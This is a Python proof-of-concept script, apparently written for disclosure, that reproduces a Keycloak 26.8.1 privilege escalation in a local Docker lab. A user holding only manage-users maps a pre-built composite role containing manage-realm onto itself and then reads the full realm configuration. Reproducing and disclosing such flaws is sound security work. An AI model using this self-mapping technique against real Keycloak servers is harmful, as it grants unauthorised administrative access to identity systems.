#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Mail    : abraxas.null@proton.me
#
#  CVE: keycloak-manage-users-composite (Medium: 6.6)
#  Vendor: Keycloak (Red Hat)
#  Versions: Keycloak 26.8.1
#  Impact: manage-users maps a pre-built composite onto self and then reads the full realm document
#  Requires: delegated admin with manage-users plus a pre-existing realm-management composite (manage-realm)
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "keycloak-manage-users-composite"
_EMAIL = "abraxas.null@proton.me"

_RST = "\033[0m"
_BLD = "\033[1m"
_CYAN = (0, 255, 249)
_MAGENTA = (255, 0, 212)
_PINK = (255, 77, 224)
_GREEN = (57, 255, 20)
_GOLD = (255, 230, 0)
_AMBER = (255, 201, 70)
_RED = (255, 64, 96)
_MUTED = (140, 155, 175)
_INK = (232, 255, 248)
_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    if not _on():
        return ""
    return f"\033[38;2;{r};{g};{b}m"


def _paint(text, rgb, bold=False):
    if not text or rgb is None:
        return text or ""
    prefix = _rgb(*rgb) + (_BLD if bold else "")
    return "".join(ch if ch == " " else prefix + ch for ch in text)


def _box(inner, border):
    edge = _rgb(*border) + "║" + _RST
    return edge + " " + inner + _RST + " " + edge


def _rule(left, right, border, width):
    return _rgb(*border) + left + "═" * (width - 2) + right + _RST


def _split(text, left_end, right_start, left_rgb, right_rgb, mid_rgb=None, left_bold=False):
    return (
        _paint(text[:left_end], left_rgb, bold=left_bold)
        + _paint(text[left_end:right_start], mid_rgb)
        + _paint(text[right_start:], right_rgb)
    )


def _fit(left, right, width, fill=" "):
    gap = max(width - len(left) - len(right), 1)
    return (left + fill * gap + right)[:width].ljust(width)


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line):
    width = max(len(line), 1)
    out = []
    quoted = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        quoted ^= ch == '"'
        if ch == '"':
            color = _AMBER if quoted else _GOLD
        elif quoted:
            color = _GOLD
        else:
            color = _rain(x, width)
        out.append(_rgb(*color) + ch)
    return "".join(out) + _RST


def _banner_width(cols):
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(row) for row in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    return content_w, box_w


def _title_row(width):
    left, right = " ABRAXAS LABS", "analyze · reverse · disclose"
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _CYAN, _MUTED, left_bold=True)


def _cve_row(width):
    left, right = " " + _CVE, "authorized research only"
    rest = max(width - len(left) - len(right), 3)
    text = (left + " local lab ".center(rest)[:rest] + right)[:width].ljust(width)
    return _split(text, len(left), width - len(right), _PINK, _GREEN, mid_rgb=_MAGENTA, left_bold=True)


def _mail_row(width):
    left, right = " Mail", _EMAIL
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _GOLD, _CYAN)


def _status_line():
    marks = {"[": _GREEN, "]": _GREEN, "*": _GREEN, "·": _PINK, "#": _PINK}
    text = "[*]  abraxas!null ready on #labs"
    return "".join(ch if ch == " " else _rgb(*marks.get(ch, _INK)) + ch for ch in text) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    content_w, box_w = _banner_width(cols)
    lines = [
        _rule("╔", "╗", _CYAN, box_w),
        _box(_title_row(content_w) + _RST, _CYAN),
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_cve_row(content_w) + _RST, _MAGENTA),
        _rule("╠", "╣", _MAGENTA, box_w),
    ]
    for glyph in _ART["abraxas"] + _ART["labs"]:
        vis = glyph[:content_w].ljust(content_w)
        lines.append(_box(_logo_line(vis), _MAGENTA))
    lines.extend([
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_mail_row(content_w) + _RST, _MAGENTA),
        _rule("╚", "╝", _CYAN, box_w),
        " " + _status_line(),
    ])
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _message_color(s):
    low = s.lower()
    stripped = s.lstrip()
    if low.startswith("success"):
        return _rgb(*_GREEN) + _BLD
    if low.startswith("fail"):
        return _rgb(*_RED) + _BLD
    if "user_id" in low:
        return _rgb(*_AMBER) + _BLD
    if low.startswith("status=") or "status=" in low[:20]:
        return _rgb(*_CYAN)
    if low.startswith("carrier"):
        return _rgb(*_MAGENTA)
    if stripped[:1] in "{[":
        return _rgb(*_GOLD)
    return _rgb(*_INK)


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    dest = kwargs.get("file", _sys.stdout)
    if dest is not _sys.stdout and dest is not _sys.stderr:
        _builtins.print(*args, **kwargs)
        return
    extra = {k: v for k, v in kwargs.items() if k != "sep"}
    _builtins.print(_message_color(s) + s + _RST, **extra)

print_abraxas_banner()
_builtins.print = _cprint

"""Keycloak 26.8.1: manage-users can map a non-admin composite of manage-realm."""

import json
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from pathlib import Path
from typing import Any

LABEL = "KC-H02-ROLEMAP"
WITNESS = "kcr02m7q4"
IMAGE = "quay.io/keycloak/keycloak:26.8.1"
PIN = "26.8.1"
HOST = "127.0.0.1"
PORT = 18082
BASE = f"http://{HOST}:{PORT}"
HERE = Path(__file__).resolve().parent
REALM = "lab"
ROLE_NAME = "sneaky-composite"
ATTR = "labWitness"
FULL_MARKER = "accessTokenLifespan"
BOOT_USER = "admin"
BOOT_PASS = "bootstrap-pass"
LIMITED_USER = "limited"
LIMITED_PASS = "limited-pass"
CONTROL_USER = "control"
CONTROL_PASS = "control-pass"
FORBIDDEN_DIRECT = frozenset({"manage-realm", "view-realm", "realm-admin"})


class ApiError(Exception):
    def __init__(self, reason: str) -> None:
        super().__init__(reason)
        self.reason = reason


@dataclass(frozen=True)
class HttpResult:
    status: int
    body: str
    headers: dict[str, str]


def request(
    method: str,
    url: str,
    *,
    headers: dict[str, str] | None = None,
    data: bytes | None = None,
    timeout: int = 60,
) -> HttpResult:
    req = urllib.request.Request(url, data=data, headers=headers or {}, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            raw = resp.read()
            hdrs = {key.lower(): value for key, value in resp.headers.items()}
            return HttpResult(resp.status, raw.decode("utf-8", errors="replace"), hdrs)
    except urllib.error.HTTPError as exc:
        raw = exc.read()
        hdrs = {key.lower(): value for key, value in exc.headers.items()}
        return HttpResult(exc.code, raw.decode("utf-8", errors="replace"), hdrs)
    except urllib.error.URLError as exc:
        raise ApiError("unreachable") from exc


def detail(result: HttpResult) -> str:
    try:
        payload = json.loads(result.body or "null")
    except json.JSONDecodeError:
        return str(result.status)
    if not isinstance(payload, dict):
        return str(result.status)
    raw = str(
        payload.get("error_description")
        or payload.get("errorMessage")
        or payload.get("error")
        or ""
    )
    cleaned = "".join(ch if ch.isalnum() else "-" for ch in raw).strip("-")[:48]
    if cleaned:
        return f"{result.status}-{cleaned}"
    return str(result.status)


def loads(result: HttpResult, prefix: str) -> Any:
    try:
        return json.loads(result.body or "null")
    except json.JSONDecodeError as exc:
        raise ApiError(f"{prefix}-json-{result.status}") from exc


def api(
    method: str,
    path: str,
    token: str,
    payload: Any | None = None,
) -> HttpResult:
    headers = {"Authorization": f"Bearer {token}", "Accept": "application/json"}
    data = None
    if payload is not None:
        headers["Content-Type"] = "application/json"
        data = json.dumps(payload).encode("utf-8")
    return request(method, f"{BASE}{path}", headers=headers, data=data)


def expect(result: HttpResult, status: int, prefix: str) -> Any:
    if result.status != status:
        raise ApiError(f"{prefix}-{detail(result)}")
    if status == 204 or not result.body.strip():
        return None
    return loads(result, prefix)


def password_token(realm: str, username: str, password: str) -> str:
    body = urllib.parse.urlencode(
        {
            "grant_type": "password",
            "client_id": "admin-cli",
            "username": username,
            "password": password,
        }
    ).encode("utf-8")
    result = request(
        "POST",
        f"{BASE}/realms/{realm}/protocol/openid-connect/token",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=body,
    )
    payload = expect(result, 200, f"token-{username}")
    access = payload.get("access_token") if isinstance(payload, dict) else None
    if not isinstance(access, str) or access.count(".") != 2:
        raise ApiError(f"token-{username}-missing")
    return access


def image_version() -> str:
    proc = subprocess.run(
        [
            "docker",
            "image",
            "inspect",
            IMAGE,
            "--format",
            '{{ index .Config.Labels "version" }}',
        ],
        check=False,
        capture_output=True,
        text=True,
    )
    return (proc.stdout or "").strip()


def created_id(result: HttpResult, prefix: str) -> str:
    if result.status != 201:
        raise ApiError(f"{prefix}-{detail(result)}")
    location = result.headers.get("location", "")
    ident = location.rstrip("/").split("/")[-1]
    if not ident:
        raise ApiError(f"{prefix}-location")
    return ident


def client_uuid(token: str, client_id: str) -> str:
    result = api("GET", f"/admin/realms/{REALM}/clients?clientId={client_id}", token)
    rows = expect(result, 200, f"client-{client_id}")
    if not isinstance(rows, list):
        raise ApiError(f"client-{client_id}-shape")
    for row in rows:
        if isinstance(row, dict) and row.get("clientId") == client_id and row.get("id"):
            return str(row["id"])
    raise ApiError(f"client-{client_id}-missing")


def role_rep(token: str, client: str, name: str) -> dict[str, Any]:
    result = api("GET", f"/admin/realms/{REALM}/clients/{client}/roles/{name}", token)
    payload = expect(result, 200, f"role-{name}")
    if not isinstance(payload, dict) or not payload.get("id"):
        raise ApiError(f"role-{name}-shape")
    return payload


def create_user(token: str, username: str, password: str) -> str:
    result = api(
        "POST",
        f"/admin/realms/{REALM}/users",
        token,
        {
            "username": username,
            "enabled": True,
            "emailVerified": True,
            "email": f"{username}@example.com",
            "firstName": username,
            "lastName": "lab",
        },
    )
    user_id = created_id(result, f"user-{username}")
    reset = api(
        "PUT",
        f"/admin/realms/{REALM}/users/{user_id}/reset-password",
        token,
        {"type": "password", "value": password, "temporary": False},
    )
    expect(reset, 204, f"password-{username}")
    return user_id


def grant_client_role(
    token: str,
    user_id: str,
    client: str,
    role: dict[str, Any],
) -> None:
    result = api(
        "POST",
        f"/admin/realms/{REALM}/users/{user_id}/role-mappings/clients/{client}",
        token,
        [{"id": role["id"], "name": role["name"]}],
    )
    expect(result, 204, f"grant-{role.get('name')}")


def direct_client_roles(token: str, user_id: str) -> list[str]:
    result = api("GET", f"/admin/realms/{REALM}/users/{user_id}/role-mappings", token)
    payload = expect(result, 200, "mappings")
    if not isinstance(payload, dict):
        raise ApiError("mappings-shape")
    client_mappings = payload.get("clientMappings") or {}
    block = client_mappings.get("realm-management") or {}
    rows = block.get("mappings") or []
    names: list[str] = []
    for row in rows:
        if isinstance(row, dict) and isinstance(row.get("name"), str):
            names.append(row["name"])
    return sorted(names)


def realm_get(token: str) -> HttpResult:
    return api("GET", f"/admin/realms/{REALM}", token)


def forbidden_doc(result: HttpResult) -> bool:
    """Partial manage-users view is HTTP 200 and omits realm attributes."""
    if WITNESS in result.body or FULL_MARKER in result.body:
        return False
    return result.status in (403, 200)


def finish(lines: list[str], last: str) -> int:
    print(last, flush=True)
    lines.append(last)
    (HERE / "poc-last-run.txt").write_text("\n".join(lines) + "\n", encoding="utf-8")
    return 0 if last.startswith("SUCCESS ") else 1


def main() -> int:
    lines: list[str] = []

    def note(msg: str) -> None:
        print(msg, flush=True)
        lines.append(msg)

    try:
        label_version = image_version()
        note(f"IOC image={IMAGE} label-version={label_version or 'missing'}")
        if PIN not in label_version:
            return finish(lines, f"FAIL {LABEL} image-label {WITNESS}")

        admin = password_token("master", BOOT_USER, BOOT_PASS)
        info = expect(api("GET", "/admin/serverinfo", admin), 200, "serverinfo")
        version = ""
        if isinstance(info, dict):
            system = info.get("systemInfo")
            if isinstance(system, dict):
                version = str(system.get("version") or "")
        note(f"IOC serverinfo-version={version or 'missing'}")
        if PIN not in version:
            return finish(lines, f"FAIL {LABEL} server-version {WITNESS}")

        expect(
            api(
                "POST",
                "/admin/realms",
                admin,
                {
                    "realm": REALM,
                    "enabled": True,
                    "attributes": {ATTR: WITNESS},
                },
            ),
            201,
            "realm",
        )
        realm_doc = expect(api("GET", f"/admin/realms/{REALM}", admin), 200, "realm-admin")
        attrs = realm_doc.get("attributes") if isinstance(realm_doc, dict) else None
        if not isinstance(attrs, dict) or attrs.get(ATTR) != WITNESS:
            raise ApiError("witness-not-stored")

        expect(
            api("POST", f"/admin/realms/{REALM}/roles", admin, {"name": ROLE_NAME}),
            201,
            "role-create",
        )
        mgmt = client_uuid(admin, "realm-management")
        manage_realm = role_rep(admin, mgmt, "manage-realm")
        manage_users = role_rep(admin, mgmt, "manage-users")
        expect(
            api(
                "POST",
                f"/admin/realms/{REALM}/roles/{ROLE_NAME}/composites",
                admin,
                [{"id": manage_realm["id"], "name": "manage-realm"}],
            ),
            204,
            "composite",
        )
        composites = expect(
            api("GET", f"/admin/realms/{REALM}/roles/{ROLE_NAME}/composites", admin),
            200,
            "composite-get",
        )
        names = [
            row.get("name")
            for row in composites
            if isinstance(row, dict)
        ]
        if "manage-realm" not in names:
            raise ApiError("composite-missing")
        note("IOC admin-composite=manage-realm")

        limited_id = create_user(admin, LIMITED_USER, LIMITED_PASS)
        control_id = create_user(admin, CONTROL_USER, CONTROL_PASS)
        grant_client_role(admin, limited_id, mgmt, manage_users)
        grant_client_role(admin, control_id, mgmt, manage_users)
        limited_roles = direct_client_roles(admin, limited_id)
        control_roles = direct_client_roles(admin, control_id)
        note(f"IOC limited-direct={','.join(limited_roles) or 'none'}")
        note(f"IOC control-direct={','.join(control_roles) or 'none'}")
        if limited_roles != ["manage-users"] or control_roles != ["manage-users"]:
            raise ApiError("extra-roles")
        if FORBIDDEN_DIRECT.intersection(limited_roles):
            raise ApiError("extra-roles")

        limited = password_token(REALM, LIMITED_USER, LIMITED_PASS)
        before = realm_get(limited)
        note(
            f"IOC before-status={before.status} "
            f"witness={int(WITNESS in before.body)} "
            f"full={int(FULL_MARKER in before.body)}"
        )
        if not forbidden_doc(before):
            return finish(lines, f"FAIL {LABEL} before-status-{before.status} {WITNESS}")

        available = expect(
            api(
                "GET",
                f"/admin/realms/{REALM}/users/{limited_id}/role-mappings/realm/available",
                limited,
            ),
            200,
            "available",
        )
        sneaky = next(
            (
                row
                for row in available
                if isinstance(row, dict) and row.get("name") == ROLE_NAME and row.get("id")
            ),
            None,
        )
        if sneaky is None:
            raise ApiError("available-missing")
        note(f"IOC available={ROLE_NAME}")

        posted = api(
            "POST",
            f"/admin/realms/{REALM}/users/{limited_id}/role-mappings/realm",
            limited,
            [{"id": sneaky["id"], "name": ROLE_NAME}],
        )
        note(f"IOC post-status={posted.status}")
        if posted.status == 403:
            return finish(lines, f"FAIL {LABEL} post-403 {WITNESS}")
        if posted.status != 204:
            return finish(lines, f"FAIL {LABEL} post-status-{posted.status} {WITNESS}")

        same_token = True
        after = HttpResult(0, "", {})
        for attempt in range(1, 9):
            after = realm_get(limited)
            seen = WITNESS in after.body and FULL_MARKER in after.body
            note(
                f"IOC after-get attempt={attempt} status={after.status} "
                f"witness={int(WITNESS in after.body)} full={int(FULL_MARKER in after.body)}"
            )
            if after.status == 200 and seen:
                break
            time.sleep(0.5)
        else:
            if after.status == 403 and WITNESS not in after.body:
                note("IOC same-token-stayed-403")
                same_token = False
                limited = password_token(REALM, LIMITED_USER, LIMITED_PASS)
                after = realm_get(limited)
                note(
                    f"IOC fresh-token status={after.status} "
                    f"witness={int(WITNESS in after.body)} "
                    f"full={int(FULL_MARKER in after.body)}"
                )

        control = password_token(REALM, CONTROL_USER, CONTROL_PASS)
        control_doc = realm_get(control)
        note(
            f"IOC control-status={control_doc.status} "
            f"witness={int(WITNESS in control_doc.body)} "
            f"full={int(FULL_MARKER in control_doc.body)} "
            f"same-token={int(same_token)}"
        )

        after_ok = (
            after.status == 200
            and WITNESS in after.body
            and FULL_MARKER in after.body
        )
        if not after_ok:
            return finish(lines, f"FAIL {LABEL} after-status-{after.status} {WITNESS}")
        if not forbidden_doc(control_doc):
            return finish(lines, f"FAIL {LABEL} control-status-{control_doc.status} {WITNESS}")
        # manage-users is itself an admin role, so this GET is 200 and returns
        # only the partial realm document. Attributes and accessTokenLifespan
        # are the full document and stay absent until the composite is mapped.
        return finish(lines, f"SUCCESS {LABEL} {WITNESS}")
    except ApiError as exc:
        return finish(lines, f"FAIL {LABEL} {exc.reason} {WITNESS}")
    except OSError:
        return finish(lines, f"FAIL {LABEL} os-error {WITNESS}")


if __name__ == "__main__":
    raise SystemExit(main())


